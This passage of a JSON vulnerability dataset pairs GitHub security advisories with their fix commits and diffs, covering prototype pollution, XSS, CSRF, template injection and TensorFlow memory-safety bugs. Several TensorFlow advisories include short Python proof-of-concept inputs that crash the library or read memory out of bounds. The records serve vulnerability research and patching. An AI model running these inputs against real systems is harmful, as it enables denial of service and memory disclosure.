issues","language":"en","entities":"[('fix', 'ACTION', ''), ('csrf', 'SECWORD', ''), ('issues', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['routes\/web.php'])","num_files":1.0},{"index":1834,"vuln_id":"GHSA-g6ww-v8xp-vmwg","cwe_id":"{'CWE-1321', 'CWE-20'}","score":7.2,"chain":"{'https:\/\/github.com\/chaijs\/pathval\/pull\/58\/commits\/21a9046cfa0c2697cb41990f3b4316db410e6c8a'}","dataset":"osv","summary":"Prototype pollution in pathval A prototype pollution vulnerability affects all versions of package pathval under 1.1.1.","published_date":"2022-02-10","chain_len":1,"project":"https:\/\/github.com\/chaijs\/pathval","commit_href":"https:\/\/github.com\/chaijs\/pathval\/pull\/58\/commits\/21a9046cfa0c2697cb41990f3b4316db410e6c8a","commit_sha":"21a9046cfa0c2697cb41990f3b4316db410e6c8a","patch":"SINGLE","chain_ord":"['21a9046cfa0c2697cb41990f3b4316db410e6c8a']","before_first_fix_commit":"{'a1230184a33a18f4eb3a92817e9b7492e8082903'}","last_fix_commit":"21a9046cfa0c2697cb41990f3b4316db410e6c8a","chain_ord_pos":1.0,"commit_datetime":"08\/25\/2020, 12:37:44","message":"fix: \ud83d\udc1b fix prototype pollution","author":"Adam Gold","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'index.js': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chaijs\/pathval\/raw\/21a9046cfa0c2697cb41990f3b4316db410e6c8a\/index.js', 'patch': '@@ -76,6 +76,9 @@ function parsePath(path) {\\n   var str = path.replace(\/([^\\\\\\\\])\\\\[\/g, \\'$1.[\\');\\n   var parts = str.match(\/(\\\\\\\\\\\\.|[^.]+?)+\/g);\\n   return parts.map(function mapMatches(value) {\\n+    if (value === \"constructor\" || value === \"__proto__\" || value === \"prototype\") {\\n+      return {}\\n+    }\\n     var regexp = \/^\\\\[(\\\\d+)\\\\]$\/;\\n     var mArr = regexp.exec(value);\\n     var parsed = null;'}}","message_norm":"fix: \ud83d\udc1b fix prototype pollution","language":"fr","entities":"[('fix', 'ACTION', ''), ('prototype pollution', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":1842,"vuln_id":"GHSA-g7xr-v82w-qggq","cwe_id":"{'CWE-94'}","score":9.8,"chain":"{'https:\/\/github.com\/nystudio107\/craft-seomatic\/commit\/3fee7d50147cdf3f999cfc1e04cbc3fb3d9f2f7d'}","dataset":"osv","summary":"Code Injection in SEOmatic In the SEOmatic plugin up to 3.4.11 for Craft CMS 3, it is possible for unauthenticated attackers to perform a Server-Side Template Injection, allowing for remote code execution.","published_date":"2022-06-13","chain_len":1,"project":"https:\/\/github.com\/nystudio107\/craft-seomatic","commit_href":"https:\/\/github.com\/nystudio107\/craft-seomatic\/commit\/3fee7d50147cdf3f999cfc1e04cbc3fb3d9f2f7d","commit_sha":"3fee7d50147cdf3f999cfc1e04cbc3fb3d9f2f7d","patch":"SINGLE","chain_ord":"['3fee7d50147cdf3f999cfc1e04cbc3fb3d9f2f7d']","before_first_fix_commit":"{'4e46b792ce973ac0c652fb330055f41aca1981c8'}","last_fix_commit":"3fee7d50147cdf3f999cfc1e04cbc3fb3d9f2f7d","chain_ord_pos":1.0,"commit_datetime":"09\/24\/2021, 18:08:04","message":"Sanitize the canonical URL after the absolute URL has been returned, to mitigate poisoned `X-Forwarded-Host` headers","author":"Andrew Welch","comments":null,"stats":"{'additions': 1, 'deletions': 2, 'total': 3}","files":"{'src\/services\/Helper.php': {'additions': 1, 'deletions': 2, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nystudio107\/craft-seomatic\/raw\/3fee7d50147cdf3f999cfc1e04cbc3fb3d9f2f7d\/src%2Fservices%2FHelper.php', 'patch': '@@ -148,9 +148,8 @@ public static function safeCanonicalUrl(): string\\n         } catch (InvalidConfigException $e) {\\n             Craft::error($e->getMessage(), __METHOD__);\\n         }\\n-        $url = DynamicMetaHelper::sanitizeUrl($url);\\n \\n-        return UrlHelper::absoluteUrlWithProtocol($url);\\n+        return DynamicMetaHelper::sanitizeUrl(UrlHelper::absoluteUrlWithProtocol($url));\\n     }\\n \\n     \/**'}}","message_norm":"sanitize the canonical url after the absolute url has been returned, to mitigate poisoned `x-forwarded-host` headers","language":"en","entities":"[('sanitize', 'SECWORD', ''), ('mitigate', 'ACTION', ''), ('poisoned', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/services\/Helper.php'])","num_files":1.0},{"index":1852,"vuln_id":"GHSA-g954-5hwp-pp24","cwe_id":"{'CWE-1321'}","score":7.5,"chain":"{'https:\/\/github.com\/protobufjs\/protobuf.js\/commit\/b5f1391dff5515894830a6570e6d73f5511b2e8f'}","dataset":"osv","summary":"Prototype Pollution in protobufjs The package protobufjs before 6.11.3 and 6.10.3 is vulnerable to Prototype Pollution, which can allow an attacker to add\/modify properties of the Object.prototype.\n\nThis vulnerability can occur in multiple ways:\n1. by providing untrusted user input to util.setProperty or to ReflectionObject.setParsedOption functions\n2. by parsing\/loading .proto files","published_date":"2022-05-28","chain_len":1,"project":"https:\/\/github.com\/protobufjs\/protobuf.js","commit_href":"https:\/\/github.com\/protobufjs\/protobuf.js\/commit\/b5f1391dff5515894830a6570e6d73f5511b2e8f","commit_sha":"b5f1391dff5515894830a6570e6d73f5511b2e8f","patch":"SINGLE","chain_ord":"['b5f1391dff5515894830a6570e6d73f5511b2e8f']","before_first_fix_commit":"{'7afd0a39f41d6df5fda6fa10c319cdf829027d3e'}","last_fix_commit":"b5f1391dff5515894830a6570e6d73f5511b2e8f","chain_ord_pos":1.0,"commit_datetime":"05\/20\/2022, 18:08:37","message":"fix: do not let setProperty change the prototype (#1731)","author":"Alexander Fenster","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'src\/util.js': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/protobufjs\/protobuf.js\/raw\/b5f1391dff5515894830a6570e6d73f5511b2e8f\/src%2Futil.js', 'patch': '@@ -176,6 +176,9 @@ util.decorateEnum = function decorateEnum(object) {\\n util.setProperty = function setProperty(dst, path, value) {\\n     function setProp(dst, path, value) {\\n         var part = path.shift();\\n+        if (part === \"__proto__\") {\\n+          return dst;\\n+        }\\n         if (path.length > 0) {\\n             dst[part] = setProp(dst[part] || {}, path, value);\\n         } else {'}}","message_norm":"fix: do not let setproperty change the prototype (#1731)","language":"en","entities":"[('change', 'ACTION', ''), ('#1731', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/util.js'])","num_files":1.0},{"index":1865,"vuln_id":"GHSA-gf2j-f278-xh4v","cwe_id":"{'CWE-369'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8c6f391a2282684a25cbfec7687bd5d35261a209'}","dataset":"osv","summary":"Division by zero in TFLite ### Impact \nAn attacker can craft a TFLite model that would trigger a division by zero in [`BiasAndClamp` implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/lite\/kernels\/internal\/common.h#L75):\n\n```cc\ninline void BiasAndClamp(float clamp_min, float clamp_max, int bias_size,\n                         const float* bias_data, int array_size,\n                         float* array_data) {\n  \/\/ ...\n  TFLITE_DCHECK_EQ((array_size % bias_size), 0);\n  \/\/ ...\n} \n```\n  \nThere is no check that the `bias_size` is non zero.\n  \n### Patches\nWe have patched the issue in GitHub commit [8c6f391a2282684a25cbfec7687bd5d35261a209](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8c6f391a2282684a25cbfec7687bd5d35261a209).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8c6f391a2282684a25cbfec7687bd5d35261a209","commit_sha":"8c6f391a2282684a25cbfec7687bd5d35261a209","patch":"SINGLE","chain_ord":"['8c6f391a2282684a25cbfec7687bd5d35261a209']","before_first_fix_commit":"{'c8dafc9f9ae6658d922e443e59e0f553167c990b'}","last_fix_commit":"8c6f391a2282684a25cbfec7687bd5d35261a209","chain_ord_pos":1.0,"commit_datetime":"12\/14\/2021, 21:40:56","message":"[lite] Add check for bias_size is zero to avoid division by zero. This shouldn't happen for properly converted models. Just safety check\n\nPiperOrigin-RevId: 416383645\nChange-Id: If8e508bf696ae8ecfb927e69c139a8ccf7fe60cb","author":"Karim Nosir","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'tensorflow\/lite\/kernels\/internal\/common.h': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8c6f391a2282684a25cbfec7687bd5d35261a209\/tensorflow%2Flite%2Fkernels%2Finternal%2Fcommon.h', 'patch': '@@ -75,6 +75,7 @@ float ActivationFunction(float x) {\\n inline void BiasAndClamp(float clamp_min, float clamp_max, int bias_size,\\n                          const float* bias_data, int array_size,\\n                          float* array_data) {\\n+  if (bias_size == 0) return;\\n   \/\/ Note: see b\/132215220: in May 2019 we thought it would be OK to replace\\n   \/\/ this with the Eigen one-liner:\\n   \/\/   return (array.colwise() + bias).cwiseMin(clamp_max).cwiseMin(clamp_max).'}}","message_norm":"[lite] add check for bias_size is zero to avoid division by zero. this shouldn't happen for properly converted models. just safety check\n\npiperorigin-revid: 416383645\nchange-id: if8e508bf696ae8ecfb927e69c139a8ccf7fe60cb","language":"en","entities":"[('add', 'ACTION', ''), ('division by zero', 'SECWORD', ''), ('safety check', 'SECWORD', ''), ('416383645', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/internal\/common.h'])","num_files":1.0},{"index":1868,"vuln_id":"GHSA-gf88-j2mg-cc82","cwe_id":"{'CWE-681'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992'}","dataset":"osv","summary":"Crash caused by integer conversion to unsigned ### Impact\nAn attacker can cause a denial of service in `boosted_trees_create_quantile_stream_resource` by using negative arguments:\n\n```python\nimport tensorflow as tf\nfrom tensorflow.python.ops import gen_boosted_trees_ops\nimport numpy as np\n\nv= tf.Variable([0.0, 0.0, 0.0, 0.0, 0.0])\ngen_boosted_trees_ops.boosted_trees_create_quantile_stream_resource(\n  quantile_stream_resource_handle = v.handle,\n  epsilon = [74.82224],\n  num_streams = [-49], \n  max_elements = np.int32(586))\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/84d053187cb80d975ef2b9684d4b61981bca0c41\/tensorflow\/core\/kernels\/boosted_trees\/quantile_ops.cc#L96) does not validate that `num_streams` only contains non-negative numbers. In turn, [this results in using this value to allocate memory](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/84d053187cb80d975ef2b9684d4b61981bca0c41\/tensorflow\/core\/kernels\/boosted_trees\/quantiles\/quantile_stream_resource.h#L31-L40):\n\n```cc\nclass BoostedTreesQuantileStreamResource : public ResourceBase {\n public:\n  BoostedTreesQuantileStreamResource(const float epsilon,\n                                     const int64 max_elements,\n                                     const int64 num_streams)\n      : are_buckets_ready_(false),\n        epsilon_(epsilon),\n        num_streams_(num_streams),\n        max_elements_(max_elements) {\n    streams_.reserve(num_streams_);\n    ...\n  }\n}\n```\n\nHowever, `reserve` receives an unsigned integer so there is an implicit conversion from a negative value to a large positive unsigned. This results in a crash from the standard library.\n\n### Patches\nWe have patched the issue in GitHub commit [8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992","commit_sha":"8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992","patch":"SINGLE","chain_ord":"['8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992']","before_first_fix_commit":"{'f8a1ac8d75f9b3d00c90148ca1e91b735b6d542c'}","last_fix_commit":"8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992","chain_ord_pos":1.0,"commit_datetime":"07\/28\/2021, 22:34:04","message":"Ensure num_streams >= 0 in tf.raw_ops.BoostedTreesCreateQuantileStreamResource\n\nPiperOrigin-RevId: 387452765\nChange-Id: I9990c760e177fabca6a3b9b4612ceeaeeba51495","author":"Laura Pak","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/kernels\/boosted_trees\/quantile_ops.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992\/tensorflow%2Fcore%2Fkernels%2Fboosted_trees%2Fquantile_ops.cc', 'patch': '@@ -116,6 +116,9 @@ class BoostedTreesCreateQuantileStreamResourceOp : public OpKernel {\\n     const Tensor* num_streams_t;\\n     OP_REQUIRES_OK(context, context->input(kNumStreamsName, &num_streams_t));\\n     int64_t num_streams = num_streams_t->scalar<int64>()();\\n+    OP_REQUIRES(context, num_streams >= 0,\\n+                errors::InvalidArgument(\\n+                    \"Num_streams input cannot be a negative integer\"));\\n \\n     auto result =\\n         new QuantileStreamResource(epsilon, max_elements_, num_streams);'}}","message_norm":"ensure num_streams >= 0 in tf.raw_ops.boostedtreescreatequantilestreamresource\n\npiperorigin-revid: 387452765\nchange-id: i9990c760e177fabca6a3b9b4612ceeaeeba51495","language":"en","entities":"[('ensure', 'ACTION', ''), ('387452765', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/boosted_trees\/quantile_ops.cc'])","num_files":1.0},{"index":1870,"vuln_id":"GHSA-gfh2-7jg5-653p","cwe_id":"{'CWE-835'}","score":4.0,"chain":"{'https:\/\/github.com\/appc\/docker2aci\/pull\/204\/commits\/54331ec7020e102935c31096f336d31f6400064f'}","dataset":"osv","summary":"Denial of Service in docker2aci docker2aci <= 0.12.3 has an infinite loop when handling local images with cyclic dependency chain.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/appc\/docker2aci","commit_href":"https:\/\/github.com\/appc\/docker2aci\/pull\/204\/commits\/54331ec7020e102935c31096f336d31f6400064f","commit_sha":"54331ec7020e102935c31096f336d31f6400064f","patch":"SINGLE","chain_ord":"['54331ec7020e102935c31096f336d31f6400064f']","before_first_fix_commit":"{'8a4173c3067a557fba64a03c6efac613dfbba6ac'}","last_fix_commit":"54331ec7020e102935c31096f336d31f6400064f","chain_ord_pos":1.0,"commit_datetime":"10\/10\/2016, 13:23:55","message":"backend\/file: fix an infinite loop in deps walking (CVE-2016-8579)\n\nThis commit fixes a possible infinite loop while traversing\nthe dependency ancestry of a malformed local image file.\n\nThis has been assigned CVE-2016-8579:\nhttps:\/\/github.com\/appc\/docker2aci\/issues\/203#issuecomment-253494006","author":"Luca Bruno","comments":null,"stats":"{'additions': 11, 'deletions': 0, 'total': 11}","files":"{'lib\/internal\/backend\/file\/file.go': {'additions': 11, 'deletions': 0, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/appc\/docker2aci\/raw\/54331ec7020e102935c31096f336d31f6400064f\/lib%2Finternal%2Fbackend%2Ffile%2Ffile.go', 'patch': '@@ -279,14 +279,24 @@ func extractEmbeddedLayer(file *os.File, layerID string, outputPath string) (*os\\n \\treturn layerFile, nil\\n }\\n \\n+\/\/ getAncestry computes an image ancestry, returning an ordered list\\n+\/\/ of dependencies starting from the topmost image to the base.\\n+\/\/ It checks for dependency loops via duplicate detection in the image\\n+\/\/ chain and errors out in such cases.\\n func getAncestry(file *os.File, imgID string) ([]string, error) {\\n \\tvar ancestry []string\\n+\\tdeps := make(map[string]bool)\\n \\n \\tcurImgID := imgID\\n \\n \\tvar err error\\n \\tfor curImgID != \"\" {\\n+\\t\\tif deps[curImgID] {\\n+\\t\\t\\treturn nil, fmt.Errorf(\"dependency loop detected at image %q\", curImgID)\\n+\\t\\t}\\n+\\t\\tdeps[curImgID] = true\\n \\t\\tancestry = append(ancestry, curImgID)\\n+\\t\\tlog.Debug(fmt.Sprintf(\"Getting ancestry for layer %q\", curImgID))\\n \\t\\tcurImgID, err = getParent(file, curImgID)\\n \\t\\tif err != nil {\\n \\t\\t\\treturn nil, err\\n@@ -328,5 +338,6 @@ func getParent(file *os.File, imgID string) (string, error) {\\n \\t\\treturn \"\", err\\n \\t}\\n \\n+\\tlog.Debug(fmt.Sprintf(\"Layer %q depends on layer %q\", imgID, parent))\\n \\treturn parent, nil\\n }'}}","message_norm":"backend\/file: fix an infinite loop in deps walking (cve-2016-8579)\n\nthis commit fixes a possible infinite loop while traversing\nthe dependency ancestry of a malformed local image file.\n\nthis has been assigned cve-2016-8579:\nhttps:\/\/github.com\/appc\/docker2aci\/issues\/203#issuecomment-253494006","language":"en","entities":"[('fix', 'ACTION', ''), ('infinite loop', 'SECWORD', ''), ('cve-2016-8579', 'VULNID', 'CVE'), ('fixes', 'ACTION', ''), ('infinite loop', 'SECWORD', ''), ('cve-2016-8579', 'VULNID', 'CVE'), ('https:\/\/github.com\/appc\/docker2aci\/issues\/203#issuecomment-253494006', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/internal\/backend\/file\/file.go'])","num_files":1.0},{"index":1872,"vuln_id":"GHSA-gg6x-xx78-448c","cwe_id":"{'CWE-87'}","score":4.0,"chain":"{'https:\/\/github.com\/octobercms\/october\/commit\/cd0b6a791f995d86071a024464c1702efc50f46c'}","dataset":"osv","summary":"Reflected XSS when importing CSV in OctoberCMS ### Impact\nA user with the ability to use the import functionality of the `ImportExportController` behavior could be socially engineered by an attacker to upload a maliciously crafted CSV file which could result in a reflected XSS attack on the user in question\n\n### Patches\nIssue has been patched in Build 466 (v1.0.466).\n\n### Workarounds\nApply https:\/\/github.com\/octobercms\/october\/commit\/cd0b6a791f995d86071a024464c1702efc50f46c to your installation manually if unable to upgrade to Build 466.\n\n### References\nReported by [Sivanesh Ashok](https:\/\/stazot.com\/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat assessment:\n<img width=\"1100\" alt=\"Screen Shot 2020-03-31 at 2 01 52 PM\" src=\"https:\/\/user-images.githubusercontent.com\/7253840\/78070158-8f7ef580-7358-11ea-950c-226533f6a0a3.png\">","published_date":"2020-06-03","chain_len":1,"project":"https:\/\/github.com\/octobercms\/october","commit_href":"https:\/\/github.com\/octobercms\/october\/commit\/cd0b6a791f995d86071a024464c1702efc50f46c","commit_sha":"cd0b6a791f995d86071a024464c1702efc50f46c","patch":"SINGLE","chain_ord":"['cd0b6a791f995d86071a024464c1702efc50f46c']","before_first_fix_commit":"{'6711dae8ef70caf0e94cec434498012a2ccd86b8'}","last_fix_commit":"cd0b6a791f995d86071a024464c1702efc50f46c","chain_ord_pos":1.0,"commit_datetime":"03\/31\/2020, 10:17:41","message":"escape import CSV column names","author":"Luke Towers","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'modules\/backend\/behaviors\/importexportcontroller\/partials\/_import_file_columns.htm': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/octobercms\/october\/raw\/cd0b6a791f995d86071a024464c1702efc50f46c\/modules%2Fbackend%2Fbehaviors%2Fimportexportcontroller%2Fpartials%2F_import_file_columns.htm', 'patch': '@@ -22,7 +22,7 @@\\n                                 class=\"column-label\"\\n                                 onclick=\"$.oc.importBehavior.loadFileColumnSample(this)\"\\n                             >\\n-                                <?= $column ?>\\n+                                <?= e($column) ?>\\n                             <\/a>\\n                         <\/span>\\n                     <\/div>'}}","message_norm":"escape import csv column names","language":"ro","entities":"[('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/backend\/behaviors\/importexportcontroller\/partials\/_import_file_columns.htm'])","num_files":1.0},{"index":1880,"vuln_id":"GHSA-gh6x-4whr-2qv4","cwe_id":"{'CWE-476', 'CWE-125'}","score":8.4,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622'}","dataset":"osv","summary":"Null pointer dereference and heap OOB read in operations restoring tensors ### Impact\nWhen restoring tensors via raw APIs, if the tensor name is not provided, TensorFlow can be tricked into dereferencing a null pointer:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Restore(\n  file_pattern=['\/tmp'],\n  tensor_name=[], \n  default_value=21,\n  dt=tf.int,\n  preferred_shard=1)\n```\n  \nThe same undefined behavior can be triggered by `tf.raw_ops.RestoreSlice`:\n  \n```python\nimport tensorflow as tf\n\ntf.raw_ops.RestoreSlice(\n  file_pattern=['\/tmp'],\n  tensor_name=[], \n  shape_and_slice='2',\n  dt=inp.array([tf.int]),\n  preferred_shard=1)\n```\n\nAlternatively, attackers can read memory outside the bounds of heap allocated data by providing some tensor names but not enough for a successful restoration:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Restore(\n  file_pattern=['\/tmp'],\n  tensor_name=['x'], \n  default_value=21,\n  dt=tf.int,\n  preferred_shard=42)\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/47a06f40411a69c99f381495f490536972152ac0\/tensorflow\/core\/kernels\/save_restore_tensor.cc#L158-L159) retrieves the tensor list corresponding to the `tensor_name` user controlled input and immediately retrieves the tensor at the restoration index (controlled via `preferred_shard` argument). This occurs without validating that the provided list has enough values.\n\nIf the list is empty this results in dereferencing a null pointer (undefined behavior). If, however, the list has some elements, if the restoration index is outside the bounds this results in heap OOB read.\n\n### Patches \nWe have patched the issue in GitHub commit [9e82dce6e6bd1f36a57e08fa85af213e2b2f2622](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622","commit_sha":"9e82dce6e6bd1f36a57e08fa85af213e2b2f2622","patch":"SINGLE","chain_ord":"['9e82dce6e6bd1f36a57e08fa85af213e2b2f2622']","before_first_fix_commit":"{'e86605c0a336c088b638da02135ea6f9f6753618'}","last_fix_commit":"9e82dce6e6bd1f36a57e08fa85af213e2b2f2622","chain_ord_pos":1.0,"commit_datetime":"08\/02\/2021, 21:21:41","message":"Fix NPE in restoring code.\n\nPiperOrigin-RevId: 388303253\nChange-Id: Ia8c68568cb854bca538909a182b31a618d68ce55","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 8, 'deletions': 1, 'total': 9}","files":"{'tensorflow\/core\/kernels\/save_restore_tensor.cc': {'additions': 8, 'deletions': 1, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622\/tensorflow%2Fcore%2Fkernels%2Fsave_restore_tensor.cc', 'patch': '@@ -151,11 +151,18 @@ void RestoreTensor(OpKernelContext* context,\\n         context, size == 1,\\n         errors::InvalidArgument(\\n             \"Input 0 (file_pattern) must be a string scalar; got a tensor of \",\\n-            size, \"elements\"));\\n+            size, \" elements\"));\\n   }\\n   const string& file_pattern = file_pattern_t.flat<tstring>()(0);\\n \\n   const Tensor& tensor_name_t = context->input(1);\\n+  {\\n+    const int64_t size = tensor_name_t.NumElements();\\n+    OP_REQUIRES(context, size > restore_index,\\n+                errors::InvalidArgument(\\n+                    \"Input 1 (file_pattern) must be a have at least \",\\n+                    restore_index + 1, \" elements\"));\\n+  }\\n   const string& tensor_name = tensor_name_t.flat<tstring>()(restore_index);\\n \\n   \/\/ If we cannot find a cached reader we will allocate our own.'}}","message_norm":"fix npe in restoring code.\n\npiperorigin-revid: 388303253\nchange-id: ia8c68568cb854bca538909a182b31a618d68ce55","language":"en","entities":"[('fix', 'ACTION', ''), ('npe', 'SECWORD', ''), ('388303253', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/save_restore_tensor.cc'])","num_files":1.0},{"index":1887,"vuln_id":"GHSA-ghww-cv4v-hmxx","cwe_id":"{'CWE-352'}","score":4.3,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/756096da1260f29ff6f4532234d93d8e41dd5aa8'}","dataset":"osv","summary":"Cross-Site Request Forgery microweber microweber prior to version 1.2.11 is vulnerable to Cross-Site Request Forgery (CSRF).","published_date":"2022-02-18","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/756096da1260f29ff6f4532234d93d8e41dd5aa8","commit_sha":"756096da1260f29ff6f4532234d93d8e41dd5aa8","patch":"SINGLE","chain_ord":"['756096da1260f29ff6f4532234d93d8e41dd5aa8']","before_first_fix_commit":"{'037744b21342f771f6a3de65ed0be936d47c3737'}","last_fix_commit":"756096da1260f29ff6f4532234d93d8e41dd5aa8","chain_ord_pos":1.0,"commit_datetime":"02\/16\/2022, 16:19:52","message":"Update UserLogoutController.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 6, 'deletions': 1, 'total': 7}","files":"{'src\/MicroweberPackages\/User\/Http\/Controllers\/UserLogoutController.php': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/756096da1260f29ff6f4532234d93d8e41dd5aa8\/src%2FMicroweberPackages%2FUser%2FHttp%2FControllers%2FUserLogoutController.php', 'patch': '@@ -5,6 +5,7 @@\\n use App\\\\Http\\\\Resources\\\\User\\\\UserResource;\\n use Illuminate\\\\Http\\\\Request;\\n use Illuminate\\\\Routing\\\\Controller;\\n+use Illuminate\\\\Support\\\\Facades\\\\Auth;\\n use MicroweberPackages\\\\App\\\\Http\\\\Middleware\\\\SameSiteRefererMiddleware;\\n \\n class UserLogoutController extends Controller\\n@@ -42,7 +43,11 @@ public function index(Request $request)\\n \\n     public function submit(Request $request)\\n     {\\n-        return logout();\\n+        Auth::logout();\\n+\\n+        $url = site_url();\\n+\\n+        return app()->url_manager->redirect($url);\\n     }\\n \\n }'}}","message_norm":"update userlogoutcontroller.php","language":"fr","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/User\/Http\/Controllers\/UserLogoutController.php'])","num_files":1.0},{"index":1891,"vuln_id":"GHSA-gj85-pvp5-mvf9","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/ptrofimov\/beanstalk_console\/commit\/e351c8260ec1d3718d9e475ee57c7e12c47f19da'}","dataset":"osv","summary":"Cross-site Scripting in Beanstalk console Beanstalk console prior to version 1.7.12 is vulnerable to cross-site scripting.","published_date":"2022-02-06","chain_len":1,"project":"https:\/\/github.com\/ptrofimov\/beanstalk_console","commit_href":"https:\/\/github.com\/ptrofimov\/beanstalk_console\/commit\/e351c8260ec1d3718d9e475ee57c7e12c47f19da","commit_sha":"e351c8260ec1d3718d9e475ee57c7e12c47f19da","patch":"SINGLE","chain_ord":"['e351c8260ec1d3718d9e475ee57c7e12c47f19da']","before_first_fix_commit":"{'95d5808836034835fc33500c6a82276277fabdf9'}","last_fix_commit":"e351c8260ec1d3718d9e475ee57c7e12c47f19da","chain_ord_pos":1.0,"commit_datetime":"02\/01\/2022, 15:43:02","message":"Sanitize input","author":"Nav-Prak","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/include.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 